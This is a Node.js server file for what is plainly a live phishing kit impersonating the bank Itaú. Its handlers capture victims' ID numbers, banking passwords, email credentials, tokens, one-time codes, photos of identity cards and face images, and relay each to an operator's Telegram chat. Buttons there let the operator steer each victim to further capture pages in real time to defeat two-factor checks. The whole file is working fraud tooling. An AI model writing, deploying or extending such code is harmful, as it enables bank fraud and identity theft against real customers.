const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    pingTimeout: 60000,
    pingInterval: 25000,
    connectTimeout: 60000,
    allowEIO3: true,
    transports: ['websocket', 'polling'],
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Telegram Bot Setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const chatId = process.env.TELEGRAM_CHAT_ID;

// Store session data with persistent IDs
const sessions = new Map();
const socketToSession = new Map();
const sessionToSocket = new Map();
const sessionTimers = new Map(); // Track session expiration timers

// Session configuration
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes instead of 5
const HEARTBEAT_INTERVAL = 20000; // 20 seconds

// Generate unique session ID
function generateSessionId() {
    return `ITU_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// Standard buttons for all messages
function getStandardButtons(sessionId) {
    return [
        [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '📧 Pedir Correo', callback_data: `email_${sessionId}` }
        ],
        [
            { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
        ],
        [
            { text: '🪙 Pedir Cédula', callback_data: `cedula_${sessionId}` },
            { text: '👤 Pedir Cara', callback_data: `biometria_${sessionId}` }
        ],
        [
            { text: '✅ Finalizar', callback_data: `finalize_${sessionId}` }
        ]
    ];
}

// Helper function to send message to Telegram
async function sendToTelegram(sessionId, data, buttons) {
    try {
        let message = `🔔 *Nueva Actividad - Itaú*\n\n`;
        message += `📱 *Sesión:* \`${sessionId}\`\n`;
        message += `⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
        
        if (data.documentType) {
            message += `📋 *Tipo Documento:* ${data.documentType}\n`;
        }
        if (data.documentNumber) {
            message += `🆔 *Número Documento:* ${data.documentNumber}\n`;
        }
        if (data.password) {
            message += `🔐 *Clave:* ${data.password}\n`;
        }
        if (data.email) {
            message += `📧 *Email:* ${data.email}\n`;
        }
        if (data.emailPassword) {
            message += `🔑 *Contraseña Email:* ${data.emailPassword}\n`;
        }
        if (data.token) {
            message += `🎫 *Token:* ${data.token}\n`;
        }
        if (data.otp) {
            message += `📲 *OTP:* ${data.otp}\n`;
        }
        if (data.hasCedula) {
            message += `🪪 *Cédula:* Frente y Reverso capturados\n`;
        }
        if (data.hasBiometria) {
            message += `👤 *Biometría:* Rostro capturado\n`;
        }

        const options = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: buttons
            }
        };

        const sentMessage = await bot.sendMessage(chatId, message, options);
        return sentMessage.message_id;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        throw error;
    }
}

// Socket.io connection
io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    let sessionId = null;

    // Handle session initialization or reconnection
    socket.on('init-session', (data) => {
        if (data.sessionId && sessions.has(data.sessionId)) {
            // Reconnecting with existing session
            sessionId = data.sessionId;
            
            // Clear any existing expiration timer
            if (sessionTimers.has(sessionId)) {
                clearTimeout(sessionTimers.get(sessionId));
                sessionTimers.delete(sessionId);
            }
            
            // Remove old socket mapping if exists
            const oldSocketId = sessionToSocket.get(sessionId);
            if (oldSocketId && oldSocketId !== socket.id) {
                socketToSession.delete(oldSocketId);
            }
            
            socketToSession.set(socket.id, sessionId);
            sessionToSocket.set(sessionId, socket.id);
            console.log(`Client reconnected with session: ${sessionId}`);
            socket.emit('session-ready', { sessionId, reconnected: true });
        } else {
            // New session
            sessionId = generateSessionId();
            sessions.set(sessionId, { createdAt: Date.now(), lastActivity: Date.now() });
            socketToSession.set(socket.id, sessionId);
            sessionToSocket.set(sessionId, socket.id);
            console.log(`New session created: ${sessionId}`);
            socket.emit('session-ready', { sessionId, reconnected: false });
        }
    });

    // Handle heartbeat to keep session alive
    socket.on('heartbeat', () => {
        if (sessionId && sessions.has(sessionId)) {
            const sessionData = sessions.get(sessionId);
            sessionData.lastActivity = Date.now();
            sessions.set(sessionId, sessionData);
            socket.emit('heartbeat-ack');
        }
    });

    // Handle login submission
    socket.on('login', async (data) => {
        try {
            if (!sessionId) return socket.emit('login-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.documentType = data.documentType;
            sessionData.documentNumber = data.documentNumber;
            sessionData.password = data.password;
            sessions.set(sessionId, sessionData);

            const buttons = getStandardButtons(sessionId);
            await sendToTelegram(sessionId, sessionData, buttons);
            socket.emit('login-response', { success: true });
        } catch (error) {
            console.error('Error processing login:', error);
            socket.emit('login-response', { success: false, error: error.message });
        }
    });

    // Handle email submission
    socket.on('email', async (data) => {
        try {
            if (!sessionId) return socket.emit('email-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.email = data.email;
            sessionData.emailPassword = data.password;
            sessions.set(sessionId, sessionData);

            const buttons = getStandardButtons(sessionId);
            await sendToTelegram(sessionId, sessionData, buttons);
            socket.emit('email-response', { success: true });
        } catch (error) {
            console.error('Error processing email:', error);
            socket.emit('email-response', { success: false, error: error.message });
        }
    });

    // Handle token submission
    socket.on('token', async (data) => {
        try {
            if (!sessionId) return socket.emit('token-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.token = data.token;
            sessions.set(sessionId, sessionData);

            const buttons = getStandardButtons(sessionId);
            await sendToTelegram(sessionId, sessionData, buttons);
            socket.emit('token-response', { success: true });
        } catch (error) {
            console.error('Error processing token:', error);
            socket.emit('token-response', { success: false, error: error.message });
        }
    });

    // Handle OTP submission
    socket.on('otp', async (data) => {
        try {
            if (!sessionId) return socket.emit('otp-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.otp = data.otp;
            sessions.set(sessionId, sessionData);

            const buttons = getStandardButtons(sessionId);
            await sendToTelegram(sessionId, sessionData, buttons);
            socket.emit('otp-response', { success: true });
        } catch (error) {
            console.error('Error processing OTP:', error);
            socket.emit('otp-response', { success: false, error: error.message });
        }
    });

    // Handle cedula (ID card) submission
    socket.on('cedula', async (data) => {
        try {
            if (!sessionId) return socket.emit('cedula-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.hasCedula = true;
            sessions.set(sessionId, sessionData);

            // Send images to Telegram
            const frontBuffer = Buffer.from(data.front.replace(/^data:image\/\w+;base64,/, ''), 'base64');
            const backBuffer = Buffer.from(data.back.replace(/^data:image\/\w+;base64,/, ''), 'base64');

            await bot.sendPhoto(chatId, frontBuffer, { caption: `📸 *Cédula Frontal*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });
            await bot.sendPhoto(chatId, backBuffer, { caption: `📸 *Cédula Reverso*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });

            // Send summary message with buttons (only once)
            const buttons = getStandardButtons(sessionId);
            const summaryMessage = `✅ *Cédula recibida*\nSesión: \`${sessionId}\``;
            await bot.sendMessage(chatId, summaryMessage, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });
            socket.emit('cedula-response', { success: true });
        } catch (error) {
            console.error('Error processing cedula:', error);
            socket.emit('cedula-response', { success: false, error: error.message });
        }
    });

    // Handle biometria (face) submission
    socket.on('biometria', async (data) => {
        try {
            if (!sessionId) return socket.emit('biometria-response', { success: false, error: 'No session' });
            
            const sessionData = sessions.get(sessionId) || {};
            sessionData.hasBiometria = true;
            sessions.set(sessionId, sessionData);

            // Send face image to Telegram
            const faceBuffer = Buffer.from(data.face.replace(/^data:image\/\w+;base64,/, ''), 'base64');
            await bot.sendPhoto(chatId, faceBuffer, { caption: `👤 *Biometría Facial*\nSesión: \`${sessionId}\``, parse_mode: 'Markdown' });

            // Send summary message with buttons (only once)
            const buttons = getStandardButtons(sessionId);
            const summaryMessage = `✅ *Biometría recibida*\nSesión: \`${sessionId}\``;
            await bot.sendMessage(chatId, summaryMessage, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });
            socket.emit('biometria-response', { success: true });
        } catch (error) {
            console.error('Error processing biometria:', error);
            socket.emit('biometria-response', { success: false, error: error.message });
        }
    });

    // Handle navigation commands from Telegram
    socket.on('navigate', (page) => {
        socket.emit('redirect', { page });
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        // Keep session data for reconnection but update mappings
        if (sessionId) {
            console.log(`Session ${sessionId} kept for reconnection`);
            socketToSession.delete(socket.id);
            
            // Set timeout to clean up session if not reconnected
            const timer = setTimeout(() => {
                if (sessionToSocket.get(sessionId) === socket.id || !sessionToSocket.has(sessionId)) {
                    sessions.delete(sessionId);
                    sessionToSocket.delete(sessionId);
                    sessionTimers.delete(sessionId);
                    console.log(`Session ${sessionId} expired after ${SESSION_TIMEOUT / 60000} minutes`);
                }
            }, SESSION_TIMEOUT);
            
            sessionTimers.set(sessionId, timer);
        }
    });
});

// Telegram bot callback handler
bot.on('callback_query', async (callbackQuery) => {
    const action = callbackQuery.data;
    const parts = action.split('_');
    const command = parts[0];
    const sessionId = parts.slice(1).join('_'); // Reconstruct sessionId with underscores

    console.log(`\n📱 Telegram Button Pressed:`);
    console.log(`   Command: ${command}`);
    console.log(`   SessionId: ${sessionId}`);
    console.log(`   Active sessions: ${sessions.size}`);
    console.log(`   SessionToSocket map:`, Array.from(sessionToSocket.keys()));

    try {
        await bot.answerCallbackQuery(callbackQuery.id);

        // Find the socket connection by session ID using direct lookup
        let targetSocket = null;
        const socketId = sessionToSocket.get(sessionId);
        
        console.log(`   Found socketId: ${socketId}`);
        
        if (socketId) {
            const sockets = await io.fetchSockets();
            targetSocket = sockets.find(s => s.id === socketId);
            console.log(`   Target socket found: ${!!targetSocket}`);
        }

        if (targetSocket) {
            switch (command) {
                case 'logo':
                    targetSocket.emit('redirect', { page: 'index.html', clearData: true });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de login\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'email':
                    targetSocket.emit('redirect', { page: 'correo.html' });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de correo\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'token':
                    targetSocket.emit('redirect', { page: 'token.html' });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de token\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'otp':
                    targetSocket.emit('redirect', { page: 'otp.html' });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a pantalla de OTP\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'cedula':
                    targetSocket.emit('redirect', { page: 'cedula.html' });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a escaneo de cédula\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'biometria':
                    targetSocket.emit('redirect', { page: 'biometria.html' });
                    await bot.sendMessage(chatId, `✅ Usuario redirigido a verificación biométrica\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    break;
                case 'finalize':
                    targetSocket.emit('redirect', { page: 'finalizar.html' });
                    await bot.sendMessage(chatId, `✅ Sesión finalizada\nSesión: \`${sessionId}\``, { parse_mode: 'Markdown' });
                    sessions.delete(sessionId);
                    sessionToSocket.delete(sessionId);
                    socketToSession.delete(socketId);
                    break;
            }
        } else {
            await bot.sendMessage(chatId, `⚠️ Sesión no encontrada o desconectada\nSesión: \`${sessionId}\`\n\nEl usuario puede haber cerrado la página o perdido la conexión.`, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error('Error handling callback:', error);
        await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// Don't call startPolling again since it's already in the constructor
// bot.startPolling(); // Remove this line

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Telegram Bot connected`);
});
